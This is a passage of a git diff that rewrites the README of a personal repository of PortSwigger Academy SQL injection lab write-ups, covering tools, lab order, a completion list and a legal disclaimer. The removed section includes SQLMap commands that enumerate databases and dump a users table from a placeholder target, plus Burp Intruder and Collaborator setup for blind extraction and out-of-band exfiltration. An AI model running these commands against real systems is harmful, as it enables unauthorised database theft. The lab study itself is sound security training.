-| 🔍 DB activity monitoring | Recommended | 🟡 Medium |
-| 🧪 Regular SQLi scanning (DAST) | Best practice | 🟡 Medium |
+Beyond that: least-privilege DB accounts (app user shouldn't have DROP), generic error messages to users, and WAF rules as a detection layer — not a prevention strategy.
 
 ---
 
-## 🛠️ Tools & Setup
+## Tools
 
-### Required Tools
-
-| Tool | Purpose | Link |
-|------|---------|-------|
-| **Burp Suite Professional** | Primary proxy, Intruder, Repeater | [portswigger.net](https://portswigger.net/burp/pro) |
-| **SQLMap** | Automated SQLi detection & exploitation | [sqlmap.org](https://sqlmap.org) |
-| **Burp Collaborator** | OOB interaction detection (built-in) | Burp Suite Pro |
-| **Python 3.x** | Custom automation scripts | [python.org](https://python.org) |
-| **Firefox + FoxyProxy** | Browser proxy routing | Browser extension |
-
-### Environment Setup
-
-```bash
-# 1. Configure Burp Proxy
-Browser → FoxyProxy → 127.0.0.1:8080
-Install Burp CA cert → Firefox certificate store
-
-# 2. SQLMap for automated exploitation
-sqlmap -u "https://target.com/products?category=gifts" \
-  --dbs --batch --level=5 --risk=3
-
-# Extract specific table
-sqlmap -u "https://target.com/products?category=gifts" \
-  -D public -T users --dump
-
-# 3. Burp Intruder for blind char-by-char
-# Mark payload position: §a§ in SUBSTRING(password,1,1)='§a§'
-# Payload: a-z, 0-9, A-Z (62 chars per position)
-# Grep match: true page response signature
-
-# 4. Collaborator for OOB
-# Burp → Burp Collaborator client → Copy payload subdomain
-# Embed in DNS/HTTP lookup payload → Poll for interactions
-```
+| Tool | What I used it for |
+|------|--------------------|
+| Burp Suite Pro | Everything — Repeater for manual testing, Intruder for blind extraction automation |
+| SQLMap | Verification after manual exploitation, `--level=5 --risk=3` for thorough coverage |
+| Burp Collaborator | OOB interaction and DNS exfiltration (Labs 15-16) |
+| Python | Custom timing scripts where Intruder's thread control wasn't granular enough |
 
 ---
 
-## 📐 Learning Path
+## Lab Order Recommendation
 
-### Prerequisites
+Do UNION labs (1–9) before anything else. The blind labs assume you already understand what you're looking for when there *is* data in the response — without that baseline, blind injection concepts don't click properly.
 
-Before starting this series, ensure proficiency in:
+Labs 11–16 are the hardest part of this series, mostly because of the mindset shift. There's nothing to look at — you're inferring everything from a page state, an HTTP status, a response time, or a DNS packet. It takes a while to trust that.
 
-- HTTP request/response cycle (methods, headers, status codes)
-- Burp Suite Proxy, Repeater, and Intruder modules
-- Basic SQL syntax (`SELECT`, `WHERE`, `JOIN`, `UNION`)
-- Cookie/session management concepts
-- URL and HTML encoding fundamentals
-
-### Recommended Lab Order
-
-```
-Phase 1 — UNION Mastery (Labs 1–9)  ──────────────────────────
-│  Start here. Build intuition for query structure,
-│  column counting, and direct data extraction.
-│  Tools: Burp Repeater only.
-│
-Phase 2 — Blind Injection (Labs 11–16)  ───────────────────────
-│  Hardest mental shift. Learn to extract data
-│  without seeing it — boolean oracles and time delays.
-│  Tools: Burp Intruder, Python scripts.
-│
-Phase 3 — Specialized (Labs 17–18)  ───────────────────────────
-│  WAF evasion and error-based leakage.
-│  Requires solid foundation from phases 1–2.
-│  Tools: Full Burp Suite Pro suite.
-│
-Phase 4 — Automation & Reporting  ──────────────────────────────
-   SQLMap for verification, professional writeup documentation.
-   Tools: SQLMap, Python, Markdown.
-```
-
-### Skills Developed Across the Series
-
-```
-✅ UNION-based data extraction
-✅ Multi-database fingerprinting (MySQL, PostgreSQL, Oracle, MSSQL)
-✅ Boolean-based blind injection
-✅ Time-based blind injection
-✅ Out-of-band (DNS/HTTP) exfiltration
-✅ WAF detection and bypass techniques
-✅ Error-based data leakage
-✅ Full schema enumeration (information_schema & Oracle catalogs)
-✅ Burp Suite Intruder automation
-✅ SQLMap usage and custom tamper scripts
-✅ Professional vulnerability documentation & CVSS scoring
-```
+Labs 17 and 18 are short. Both rely on understanding how layers of parsing work — WAF vs XML parser in 17, verbose errors in 18. More about knowing the environment than complex exploitation.
 
 ---
 
-## 📋 Lab Completion Tracker
+## Completion
 
-### 🟢 Apprentice Level — `9 / 9 Complete`
-
-- [x] [Lab 1 · SQL Injection WHERE Clause — Retrieve Hidden Data](./LAB-1-SQL-Injection.md)
-- [x] [Lab 2 · SQL Injection — Login Bypass](./LAB-2-SQL-Injection.md)
-- [x] [Lab 3 · UNION — Determine Column Count](./LAB-3-SQL-Injection.md)
-- [x] [Lab 4 · UNION — Find Text-Compatible Columns](./LAB-4-SQL-Injection.md)
-- [x] [Lab 5 · UNION — Retrieve Data from Other Tables](./LAB-5-SQL-Injection.md)
-- [x] [Lab 6 · UNION — Retrieve Multiple Values in One Column](./LAB-6-SQL-Injection.md)
-- [x] [Lab 7 · Query Database Type & Version (Oracle)](./LAB-7-SQL-Injection.md)
-- [x] [Lab 8 · Query Database Type & Version (MySQL/MSSQL)](./LAB-8-SQL-Injection.md)
-- [x] [Lab 9 · List Database Contents (non-Oracle)](./LAB-9-SQL-Injection.md)
-
-### 🟡 Practitioner Level — `8 / 8 Complete`
-
-- [x] [Lab 10 · List Database Contents (Oracle)](./LAB-10-SQL-Injection.md)
-- [x] [Lab 11 · Blind SQLi — Conditional Responses](./LAB-11-SQL-Injection.md)
-- [x] [Lab 12 · Blind SQLi — Conditional Errors](./LAB-12-SQL-Injection.md)
-- [x] [Lab 13 · Blind SQLi — Time Delays](./LAB-13-SQL-Injection.md)
-- [x] [Lab 14 · Blind SQLi — Time Delays & Data Exfiltration](./LAB-14-SQL-Injection.md)
-- [x] [Lab 15 · Blind SQLi — Out-of-Band Interaction](./LAB-15-SQL-Injection.md)
-- [x] [Lab 16 · Blind SQLi — Out-of-Band Data Exfiltration](./LAB-16-SQL-Injection.md)
-- [x] [Lab 17 · SQL Injection Filter Bypass via XML Encoding](./LAB-17-SQL-Injection.md)
-
-### 🔴 Expert Level — `1 / 1 Complete`
-
-- [x] [Lab 18 · Visible Error-Based SQL Injection](./LAB-18-SQL-Injection.md)
+- [x] Lab 1 — WHERE Clause Hidden Data
+- [x] Lab 2 — Login Bypass
+- [x] Lab 3 — UNION Column Count
+- [x] Lab 4 — UNION String Columns
+- [x] Lab 5 — UNION Data Extraction
+- [x] Lab 6 — UNION Single Column Concat
+- [x] Lab 7 — Version Fingerprint (Oracle)
+- [x] Lab 8 — Version Fingerprint (MySQL/MSSQL)
+- [x] Lab 9 — Schema Enumeration (non-Oracle)
+- [x] Lab 10 — Schema Enumeration (Oracle)
+- [x] Lab 11 — Blind Boolean
+- [x] Lab 12 — Blind Conditional Error
+- [x] Lab 13 — Blind Time Delay
+- [x] Lab 14 — Blind Time + Extraction
+- [x] Lab 15 — Blind OOB Interaction
+- [x] Lab 16 — Blind OOB Exfiltration
+- [x] Lab 17 — WAF Bypass XML Encoding
+- [x] Lab 18 — Visible Error-Based
 
 ---
 
-## 📚 Additional Resources
+## Resources
 
-### Official Documentation
-- [PortSwigger SQL Injection Labs](https://portswigger.net/web-security/sql-injection)
-- [PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
-- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
-- [OWASP Top 10 — A03:2021 Injection](https://owasp.org/Top10/A03_2021-Injection/)
-- [NIST NVD — CWE-89 SQLi](https://nvd.nist.gov/vuln/search/results?cwe_id=CWE-89)
+- [PortSwigger SQLi Labs](https://portswigger.net/web-security/sql-injection)
+- [PortSwigger SQLi Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) — keep this open during blind labs
+- [OWASP SQLi Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
+- [CWE-89](https://nvd.nist.gov/vuln/search/results?cwe_id=CWE-89)
 
-### Research & Talks
-- *"SQL Injection Attacks and Defense"* — Justin Clarke (Syngress)
-- *"Advanced SQL Injection to Operating System Full Control"* — Bernardo Damele (Black Hat 2009)
-- *"Blind SQL Injection Automation Techniques"* — PortSwigger Research
-
-### Related Lab Series in This Repository
-- [🔐 Authentication Vulnerabilities](./AUTHENTICATION/) — 14 labs complete
-- [🌐 Cross-Site Scripting (XSS)](./XSS/) — Coming Soon
-- [🔓 Access Control](./ACCESS-CONTROL/) — Coming Soon
-- [🗂️ File Path Traversal](./PATH-TRAVERSAL/) — Coming Soon
+Other series in this repo:
+- [Authentication Vulnerabilities](./AUTHENTICATION/) — 14 labs done
+- XSS — in progress
+- Access Control — in progress
 
 ---
 
-## 🏆 Final Achievement Summary
+## Legal
 
-<div align="center">
-
-```
-╔═════════════════════════════════════════════════════════════════╗
-║                                                                 ║
-║                  💉  SQL INJECTION — COMPLETE                   ║
-╠═════════════════════════════════════════════════════════════════╣
-║                                                                 ║
-║   Labs Completed     18 / 18          ✅  100%                  ║
-║   Apprentice          9 / 9            🟢  Complete             ║
-║   Practitioner        8 / 8            🟡  Complete             ║
-║   Expert              1 / 1            🔴  Complete             ║
-║   Hours Invested      60+              ⏱️   Documented          ║
-║   Databases Covered   4                🗄️   All Major DBs       ║
-║                                                                 ║
-╠═════════════════════════════════════════════════════════════════╣
-║                                                                 ║
-║  ➡️  Up Next:   Cross-Site Scripting (XSS) Lab Series            ║
-║  ➡️  Then:      Access Control & IDOR                            ║
-║  ➡️  Then:      Server-Side Request Forgery (SSRF)               ║
-║                                                                 ║
-╚═════════════════════════════════════════════════════════════════╝
-```
-
-</div>
+All of this was done on PortSwigger Academy's lab environment. Using these techniques against systems you don't own or don't have written permission to test is illegal in most jurisdictions and not something I'd document here if I did it.
 
 ---
 
-## ⚖️ Legal & Ethical Disclaimer
+*Gurpreet Singh — [GitHub](https://github.com/Gurpreet-Singh-offensive-Security/Offensive-Security-Labs) · [LinkedIn](https://www.linkedin.com/in/gurpreetsingh-security) · [Email](mailto:gskhalsa6245@gmail.com)*
 
-<div align="center">
-
-### ⚠️ AUTHORIZED USE ONLY
-
-**All techniques, payloads, and methods documented in this repository are strictly for:**
-
-✅ Authorized penetration testing with written permission  
-✅ Educational study in controlled lab environments (PortSwigger Academy)  
-✅ CTF competitions and legal bug bounty programs  
-✅ Security research on systems you own  
-
-</div>
-
-**Unauthorized use of these techniques against any system is illegal** under:
-
-| Jurisdiction | Law | Maximum Penalty |
-|---|---|---|
-| 🇺🇸 United States | Computer Fraud and Abuse Act (CFAA) | 20 years imprisonment |
-| 🇬🇧 United Kingdom | Computer Misuse Act 1990 | 10 years imprisonment |
-| 🇪🇺 European Union | ePrivacy Directive + GDPR | €20M or 4% of revenue |
-| 🇨🇦 Canada | Criminal Code Section 342.1 | 10 years imprisonment |
-| 🇦🇺 Australia | Criminal Code Act 1995 | 10 years imprisonment |
-
-**The author assumes zero liability for misuse of this material. Always hack legally and ethically.**
-
----
-
-## 🔬 Author
-
-<div align="center">
-
-### Created by Gurpreet Singh
-
-**Offensive Security Researcher | Red Team Engineer in Training**
-
-[![GitHub](https://img.shields.io/badge/GitHub-Offensive--Security--Labs-181717?style=for-the-badge&logo=github)](https://github.com/Gurpreet-Singh-offensive-Security/Offensive-Security-Labs)
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-Connect-0077B5?style=for-the-badge&logo=linkedin)](https://www.linkedin.com/in/gurpreetsingh-security)
-[![Email](https://img.shields.io/badge/Email-Contact-D14836?style=for-the-badge&logo=gmail)](mailto:gskhalsa6245@gmail.com)
-
----
-
-### 📄 License
-
-**CC BY-NC-ND 4.0** — Attribution · NonCommercial · NoDerivatives
-
-*Copyright © 2025 Gurpreet Singh. All rights reserved.*
-
-</div>
-
----
-
-## 🎓 Acknowledgments
-
-- **PortSwigger Web Security Academy** — World-class free security training platform
-- **OWASP Foundation** — Comprehensive open security documentation
-- **The InfoSec Community** — For the culture of open knowledge sharing
-
----
-
-<div align="center">
-
-**💉 Series Complete** · **🗄️ All 4 Databases Covered** · **🔴 Expert Level Achieved** · **18/18 Documented**
-
-*Keep learning, keep hacking — legally.* 🔐
-
-</div>
+*CC BY-NC-ND 4.0 — © 2025 Gurpreet Singh*
